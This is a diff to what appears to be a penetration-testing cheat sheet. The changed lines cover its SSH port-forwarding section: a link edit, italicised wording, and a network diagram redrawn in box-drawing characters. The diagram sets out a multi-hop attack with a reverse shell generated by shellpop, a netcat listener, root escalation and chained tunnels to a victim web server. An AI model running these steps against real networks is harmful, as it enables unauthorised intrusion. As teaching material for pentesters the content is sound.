@@ -4947,7 +4947,7 @@ Stager encryption is the same as for Ruler/Forms.
 
 ## SSH
 
-* [https://habr.com/ru/post/331348/#t2](https://habr.com/ru/post/331348/#t2)
+* [https://habr.com/ru/post/331348/](https://habr.com/ru/post/331348/)
 
 
 
@@ -4955,52 +4955,52 @@ Stager encryption is the same as for Ruler/Forms.
 
 A cheatsheet for SSH Local/Remote Forwarding command syntax:
 
-* `-L 1111:127.0.0.1:2222`: the traffic is forwarded *from SSH client via SSH server*, so `1111` is listening on client-side and traffic is sent to `2222` on server-side.
-* `-R 2222:127.0.0.1:1111`: the traffic is forwarded *from SSH server via SSH client*, so `2222` is listening on server-side and traffic is sent to `1111` on client-side.
+* `-L 1111:127.0.0.1:2222`: the traffic is forwarded *from SSH client via SSH server*, so `1111` is listening on *client-side* and traffic is sent to `2222` on *server-side*.
+* `-R 2222:127.0.0.1:1111`: the traffic is forwarded *from SSH server via SSH client*, so `2222` is listening on *server-side* and traffic is sent to `1111` on *client-side*.
 
-Consider the following example. An attacker has root privileges on Pivot1. He creates the first SSH tunnel (remote port forwarding) to interact with a vulnerable web server on Pivot2. Then he exploits the vulnerability on Pivot2 and triggers it to connect back to Attacker with a reverse-shell (firewall is active, so he needs to pivot through port 443, which is allowed). After that the attacker performs PE on Pivot2 and gets root. Then he creates another tunnel (local port forwarding) over the first one to SSH into Pivot2 from Attacker. Finally, he forwards port 80 over two existing hops to pwn a vulnerable web server on Victim.
+Consider the following example. An attacker has root privileges on Pivot1. He creates the first SSH tunnel (remote port forwarding) to interact with a vulnerable web server on Pivot2. Then he exploits the vulnerability on Pivot2 and triggers it to connect back to Attacker via a reverse-shell (firewall is active, so he needs to pivot through port 443, which is allowed). After that the attacker performs PE on Pivot2 and gets root. Then he creates another tunnel (local port forwarding) over the first one to SSH into Pivot2 from Attacker. Finally, he forwards port 80 over two existing hops to pwn a vulnerable web server on Victim.
 
 ```
   Attacker (10.10.13.37)                                                    Pivot1 (10.1.1.1)                                  Pivot2 (10.2.2.2)                   Victim (10.3.3.3)
-+----------------------------------------------------------------------+  +-----------------------------------------------+  +--------------------------------+  +-------------------+
-|                                                                   22 |  |                                               |  |                                |  |                   |
-| 1.  ssh -R 443:127.0.0.1:9001 root@10.1.1.1 ------------------------------> 10.1.1.1:22                                 |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-| 2.                                                                   |  |   Listens 0.0.0.0:443 ("GatewayPorts yes")    |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-| 3.                                                                   |  |   ~C ssh> -L 9002:10.2.2.2:80                 |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-| 4.  Listens 127.0.0.1:9002 (to interact with web server 10.2.2.2:80) |  |                                               |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-| 5.  shellpop -H 10.2.2.2 -P 443 --reverse --number 8 --base64        |  |                                               |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-|                                                9001 over 10.1.1.1:22 |  |                                           443 |  |                                |  |                   |
-| 6.  rlwrap nc -lvnp 9001 <--- 127.0.0.1:9001 <----------------------------- 0.0.0.0:443 <-------------------------------+--+-- Web server 10.2.2.2:80       |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-| 7.  Got shell from 10.2.2.2                                          |  |                                               |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-| 8.  Got root on 10.2.2.2                                             |  |                                               |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-|                                                                      |  |   ~C ssh> -L 9003:127.0.0.1:1337              |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-| 9.  Listens 127.0.0.1:9003                                           |  |                                               |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-|                                                                      |  |                                            22 |  |                                |  |                   |
-|                                                                      |  |   ssh -L 1337:127.0.0.1:22 root@10.2.2.2 ----------> 10.2.2.2:22                  |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-|                                                                      |  |   Listens 127.0.0.1:1337                      |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-|                                                1337 over 10.1.1.1:22 |  |                           22 over 10.2.2.2:22 |  |                                |  |                   |
-| 10. ssh root@127.0.0.1 -p 9003 -------------------------------------------> 127.0.0.1:1337 ----------------------------------> 127.0.0.1:22                 |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-|                                                                      |  |                                               |  |   ~C ssh> -L 9004:10.3.3.3:80  |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-| 11. Listens 127.0.0.1:9004                                           |  |                                               |  |                                |  |                   |
-|                                                                      |  |                                               |  |                                |  |                   |
-|                                                1337 over 10.1.1.1:22 |  |                           22 over 10.2.2.2:22 |  |                                |  |                   |
-| 12. curl http://127.0.0.1:9004/ ------------------------------------------> 127.0.0.1:1337 ----------------------------------> 127.0.0.1:22 ----------------+--+-> 10.3.3.3:80     |
-|                                                                      |  |                                               |  |                                |  |                   |
-+----------------------------------------------------------------------+  +-----------------------------------------------+  +--------------------------------+  +-------------------+
+┌──────────────────────────────────────────────────────────────────────┐  ┌───────────────────────────────────────────────┐  ┌────────────────────────────────┐  ┌───────────────────┐
+│                                                                   22 │  │                                               │  │                                │  │                   │
+│ 1.  ssh -R 443:127.0.0.1:9001 root@10.1.1.1 ------------------------------► 10.1.1.1:22                                 │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 2.                                                                   │  │   Listens 0.0.0.0:443 ("GatewayPorts yes")    │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 3.                                                                   │  │   ~C ssh> -L 9002:10.2.2.2:80                 │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 4.  Listens 127.0.0.1:9002 (to interact with web server 10.2.2.2:80) │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 5.  shellpop -H 10.2.2.2 -P 443 --reverse --number 8 --base64        │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                9001 over 10.1.1.1:22 │  │                                           443 │  │                                │  │                   │
+│ 6.  rlwrap nc -lvnp 9001 ◄--- 127.0.0.1:9001 ◄----------------------------- 0.0.0.0:443 ◄───────────────────────────────┼──┼── Web server 10.2.2.2:80       │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 7.  Got shell from 10.2.2.2                                          │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 8.  Got root on 10.2.2.2                                             │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                                      │  │   ~C ssh> -L 9003:127.0.0.1:1337              │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 9.  Listens 127.0.0.1:9003                                           │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                            22 │  │                                │  │                   │
+│                                                                      │  │   ssh -L 1337:127.0.0.1:22 root@10.2.2.2 ----------► 10.2.2.2:22                  │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                                      │  │   Listens 127.0.0.1:1337                      │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                1337 over 10.1.1.1:22 │  │                           22 over 10.2.2.2:22 │  │                                │  │                   │
+│ 10. ssh root@127.0.0.1 -p 9003 -------------------------------------------► 127.0.0.1:1337 ----------------------------------► 127.0.0.1:22                 │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │   ~C ssh> -L 9004:10.3.3.3:80  │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 11. Listens 127.0.0.1:9004                                           │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                1337 over 10.1.1.1:22 │  │                           22 over 10.2.2.2:22 │  │                                │  │                   │
+│ 12. curl http://127.0.0.1:9004/ ------------------------------------------► 127.0.0.1:1337 ----------------------------------► 127.0.0.1:22 ────────────────┼──┼─► 10.3.3.3:80     │
+│                                                                      │  │                                               │  │                                │  │                   │
+└──────────────────────────────────────────────────────────────────────┘  └───────────────────────────────────────────────┘  └────────────────────────────────┘  └───────────────────┘
 ```
 
 Notes:
